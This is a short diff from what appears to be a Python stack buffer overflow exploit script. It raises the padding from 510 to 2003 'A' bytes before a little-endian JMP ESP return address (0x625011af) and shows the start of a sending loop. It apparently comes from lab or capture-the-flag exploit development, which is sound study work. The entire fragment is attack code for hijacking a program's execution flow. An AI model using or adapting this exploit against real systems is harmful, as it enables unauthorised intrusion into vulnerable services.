@@ -5,7 +5,7 @@ from time import sleep
 
 # our JMP ESP address is at  0x625011af
 
-buffer = b"A" * 510 + b"\xaf\x11\x50\x62"
+buffer = b"A" * 2003 + b"\xaf\x11\x50\x62"
 
 while True:
     try:
